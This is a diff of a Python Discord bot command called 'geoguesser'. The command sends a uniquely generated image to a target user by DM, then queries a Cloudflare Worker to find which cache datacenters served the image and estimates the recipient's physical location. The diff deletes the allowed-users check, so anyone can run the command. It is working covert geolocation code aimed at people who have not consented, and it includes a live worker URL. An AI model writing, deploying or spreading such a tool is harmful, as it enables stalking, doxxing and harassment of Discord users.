@@ -1,11 +1,8 @@
 """
-z command nga for zaneok and ppl who use zbot dm me if uw ant accses or just larp my code
-
 geoguesser.py – !geoguesser <@user>
 Generates a unique random image, sends it to a target user,
-then uses Cloudflare cache enumeration to locate the target.
-Displays results with a map and estimated radius.
-Allowed users: OWNER_ID + ALLOWED_USERS list.
+then uses Cloudflare cache enumeration to estimate their location.
+Public command – anyone can use it.
 """
 
 import asyncio
@@ -18,11 +15,6 @@ from datetime import datetime
 import math
 
 # ============ CONFIGURATION ============
-OWNER_ID = 981259484691325018
-ALLOWED_USERS = [
-    981259484691325018,   # your ID
-    1111670025519112192,  # friend's ID
-]
 WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
 # =======================================
 
@@ -51,6 +43,7 @@ COLO_COORDS = {
 }
 
 def generate_random_image():
+    """Generate a 64x64 PNG with random pixels + random lines – totally unique each time."""
     w, h = 64, 64
     img = Image.new('RGB', (w, h))
     pixels = img.load()
@@ -72,6 +65,7 @@ def generate_random_image():
     return img_bytes
 
 def haversine(lat1, lon1, lat2, lon2):
+    """Distance in miles between two coordinates."""
     R = 3959
     lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
     dlat = lat2 - lat1
@@ -80,16 +74,14 @@ def haversine(lat1, lon1, lat2, lon2):
     return R * 2 * math.asin(math.sqrt(a))
 
 async def run(client, message, args):
-    if message.author.id not in ALLOWED_USERS:
-        await message.channel.send("Unauthorized.", delete_after=5)
-        return
-
+    # No authorization check – anyone can use it
     if not args.strip():
         await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
         return
 
     target_arg = args.strip().split()[0]
 
+    # Resolve target user
     try:
         if target_arg.startswith('<@') and target_arg.endswith('>'):
             user_id = int(target_arg.strip('<@!>'))
@@ -100,20 +92,28 @@ async def run(client, message, args):
         await message.channel.send("❌ Invalid user ID or mention.")
         return
 
+    # Status message
     status_msg = await message.channel.send("🖼️ Generating unique image...")
+
+    # 1) Generate image
     img_bytes = generate_random_image()
 
+    # 2) Upload to Discord CDN (Cloudflare-backed)
     await status_msg.edit(content="📤 Uploading to Discord CDN...")
-    sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
+    try:
+        sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
+    except Exception as e:
+        await status_msg.edit(content=f"❌ Failed to upload image: {e}")
+        return
     if not sent.attachments:
-        await status_msg.edit(content="❌ Failed to upload image.")
+        await status_msg.edit(content="❌ No attachment URL returned.")
         return
     image_url = sent.attachments[0].url
-    await sent.delete()
+    await sent.delete()  # Remove the upload message from channel
 
-    await status_msg.edit(content=f"✅ Image URL: {image_url[:60]}...")
+    await status_msg.edit(content=f"✅ Image uploaded. Sending to target...")
 
-    await status_msg.edit(content=f"📨 Sending image to {target.name}...")
+    # 3) Send to target via DM
     try:
         img_bytes.seek(0)
         await target.send(file=discord.File(img_bytes, filename="geo.png"))
@@ -122,12 +122,14 @@ async def run(client, message, args):
         await status_msg.edit(content="❌ Cannot DM that user (DMs closed).")
         return
     except Exception as e:
-        await status_msg.edit(content=f"❌ Failed to send: {e}")
+        await status_msg.edit(content=f"❌ Failed to send DM: {e}")
         return
 
+    # 4) Wait for cache propagation
     await status_msg.edit(content="⏳ Waiting 12 seconds for cache & notifications...")
     await asyncio.sleep(12)
 
+    # 5) Enumerate via Cloudflare Worker
     await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
     api_url = f"{WORKER_URL}?url={image_url}"
 
@@ -138,6 +140,9 @@ async def run(client, message, args):
                     await status_msg.edit(content=f"❌ Worker error (HTTP {resp.status})")
                     return
                 data = await resp.json()
+    except asyncio.TimeoutError:
+        await status_msg.edit(content="❌ Worker timed out. The network might be slow.")
+        return
     except Exception as e:
         await status_msg.edit(content=f"❌ Worker call failed: {e}")
         return
@@ -147,9 +152,10 @@ async def run(client, message, args):
     checked = data.get('checked', 0)
 
     if not datacenters:
-        await status_msg.edit(content="❌ No cache hits. Target may not have downloaded the image.")
+        await status_msg.edit(content="❌ No cache hits. The target may not have downloaded the image, or the image URL isn't cached on Cloudflare. Try again with a different image (wait a moment).")
         return
 
+    # 6) Compute location
     coords = []
     colo_names = []
     for colo in datacenters:
@@ -165,9 +171,11 @@ async def run(client, message, args):
         max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
         radius_miles = max_dist * 1.5 if max_dist > 0 else 250
 
+        # Generate static map URL (OpenStreetMap)
         markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
         map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&markers={markers}&maptype=mapnik"
 
+        # Build embed
         embed = discord.Embed(
             title="📍 GeoGuesser – Location Estimate",
             description=f"**Target:** {target.name}\n"
@@ -186,4 +194,4 @@ async def run(client, message, args):
         await status_msg.delete()
         await message.channel.send(embed=embed)
     else:
-        await status_msg.edit(content=f"Found datacenters: {', '.join(datacenters)} – but no coordinates available.")
+        await status_msg.edit(content=f"Found datacenters: {', '.join(datacenters)} – but no coordinates available for these colos.")
